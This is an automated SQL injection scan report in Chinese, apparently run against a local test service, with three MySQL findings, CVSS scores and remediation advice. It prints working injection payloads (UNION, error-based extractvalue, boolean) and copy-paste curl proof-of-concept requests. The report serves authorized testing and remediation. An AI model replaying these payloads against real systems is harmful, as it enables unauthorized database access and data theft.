# SQL 注入检测报告

- 扫描ID：`iHnRSgoy7gqS`
- 目标：`http://127.0.0.1:8297/num?id=1`
- 风险等级：**High**
- 数据库：MySQL
- 注入点：1 · 漏洞：3


## 报告元信息

- 起止时间：2026-09-16T07:04:04.076Z → 2026-09-16T07:04:04.326Z（耗时 250ms）
- 请求总数：59 · 检测配置：level=3 · risk=2 · 技术=union/error/boolean/time
- 测试范围：未显式配置——按「目标 URL 同源」口径执行
- 授权声明：本报告仅供授权安全测试使用；未获授权对任何系统进行扫描、测试或数据提取均可能违反法律法规。
- 生成时间：2026-09-16T07:04:04.326Z


## 执行摘要

- 目标 http://127.0.0.1:8297/num?id=1 共测试 1 个注入点，检出 **3** 条 SQL 注入漏洞（技术：union/error/boolean），最高风险 **High**，数据库 MySQL。
- 影响实证：本次未开启拖库（enableExtract），影响面按检出通道定性推断（union/error 通道通常可达数据读出）。
- 结论可信度：ok——目标可达性与会话状态正常：累计 59 次请求，无连续失败/拦截/会话失效/持续 5xx 迹象。
- 定库依据：真实引擎验证（MySQL）。

## 本次命中与抑制项

- 本次已检出 **3** 条漏洞（详见下方清单）；verdict 仅用于描述「未检出」类阴性结论的可信度，不适用于本次结果。
> 本次扫描检出 3 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，命中详情见 vulns

- 本次被抑制的能力（不代表已测试）：
  - 高危 payload 池（写文件/RCE/重运算类，本配置下候选 1 条）已抑制：productionMode=true 且未 confirmDestructive=true。确需在已授权目标上投放时显式设 confirmDestructive=true；靶场/演练环境可整体关护栏（productionMode=false）

## 漏洞清单

| 注入点 | 技术 | 数据库 | 风险 | CVSS | 说明 |
|---|---|---|---|---|---|
| 283e732d | union | MySQL | High | 8.2（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N） | UNION 注入成功，回显列：0,1,2,3,4（列数 5） |
| 283e732d | error | MySQL | High | 8.2（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N） | 数据库报错回显：SQL syntax（识别为 MySQL） |
| 283e732d | boolean | MySQL | Medium | 7.5（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N） | 布尔注入确认(统计·自适应): 真≈基线1.00、假≠基线1.00、差异1.00、基线噪声0.00、门槛0.66、z=2.83(显著) |


## 修复建议（Remediation）

### 按注入点

**283e732d · union · CVSS 8.2 High**（`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`）

- 改用参数化查询/预编译语句，禁止用字符串拼接把用户输入并入 SQL 文本
- 应用数据库账号最小权限：禁用 FILE 权限与跨库访问，限制 information_schema 可见范围
- 注意：关键字过滤（UNION/SELECT）只能缓解已知特征，不能作为修复依据

**283e732d · error · CVSS 8.2 High**（`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`）

- 关闭生产环境的数据库报错回显，统一改为通用错误页 + 服务端日志记录
- 改用参数化查询/预编译语句，从根源上消除注入点
- 注意：报错回显泄露 SQL 上下文与数据库指纹，是定库与后续利用的跳板

**283e732d · boolean · CVSS 7.5 High**（`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`）

- 改用参数化查询/预编译语句
- 排查响应差异的来源（业务分支依赖了原始 SQL 拼接结果）
- 注意：布尔通道不依赖回显与报错，关闭报错/过滤关键字都挡不住它

### 通用加固基线

- 所有 SQL 一律参数化/预编译，或经 ORM 的绑定参数接口；代码审计重点排查字符串拼接构造 SQL 的路径
- 数据库账号最小权限：应用账号禁用 FILE/写权限、限制可见库表、禁用多语句
- 生产环境关闭数据库报错回显，统一错误页 + 服务端日志
- 输入校验在服务端做（类型强转/白名单），前端校验仅作体验优化
- WAF/输入过滤只能缓解已知特征，不能替代代码层修复
- 修复后对本次命中的注入点做回归复扫，确认为 0 命中后关闭工单

> CVSS 口径：v3.1 启发式映射（按技术通道给分，环境项未设），供排期排序参考，非逐条人工评定。

## Payload 示例

- `1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3','SQLISCANNER4'-- -`
- `1 ORDER BY 5-- -`
- `1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- `1 AND 1=1`
- `1 AND 1=2`

## 复现方式（PoC）

以下请求由引擎实际发送形态还原（含 prefix/suffix 与会话上下文），可直接回放验证“这不是误报”。

### PoC-1-1 · 注入点 283e732d · union · 主命中

- 请求：`GET http://127.0.0.1:8297/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-`
- Payload：`1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3','SQLISCANNER4'-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-16T07:04:04.507Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8297/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-'
```

原始报文（存为 `poc-1-1-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+- HTTP/1.1
Host: 127.0.0.1:8297


```

### PoC-1-2 · 注入点 283e732d · union · 补充 payload 2

- 请求：`GET http://127.0.0.1:8297/num?id=1+ORDER+BY+5--+-`
- Payload：`1 ORDER BY 5-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构；凭据头已按 pocRedactAuth 脱敏
- 生成时间：2026-09-16T07:04:04.512Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8297/num?id=1+ORDER+BY+5--+-'
```

原始报文（存为 `poc-1-2-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /num?id=1+ORDER+BY+5--+- HTTP/1.1
Host: 127.0.0.1:8297


```

### PoC-2-1 · 注入点 283e732d · error · 主命中

- 请求：`GET http://127.0.0.1:8297/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-`
- Payload：`1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-16T07:04:04.508Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8297/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-'
```

原始报文（存为 `poc-2-1-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+- HTTP/1.1
Host: 127.0.0.1:8297


```

### PoC-3-1 · 注入点 283e732d · boolean · 主命中

- 请求：`GET http://127.0.0.1:8297/num?id=1+AND+1%3D1`
- Payload：`1 AND 1=1`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-16T07:04:04.508Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8297/num?id=1+AND+1%3D1'
```

原始报文（存为 `poc-3-1-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /num?id=1+AND+1%3D1 HTTP/1.1
Host: 127.0.0.1:8297


```

### PoC-3-2 · 注入点 283e732d · boolean · 补充 payload 2

- 请求：`GET http://127.0.0.1:8297/num?id=1+AND+1%3D2`
- Payload：`1 AND 1=2`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构；凭据头已按 pocRedactAuth 脱敏
- 生成时间：2026-09-16T07:04:04.512Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8297/num?id=1+AND+1%3D2'
```

原始报文（存为 `poc-3-2-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /num?id=1+AND+1%3D2 HTTP/1.1
Host: 127.0.0.1:8297


```


## WAF 交战记录

- 本次未观察到 WAF 拦截或厂商特征（activeWafProbe 默认关闭，未主动探测）。
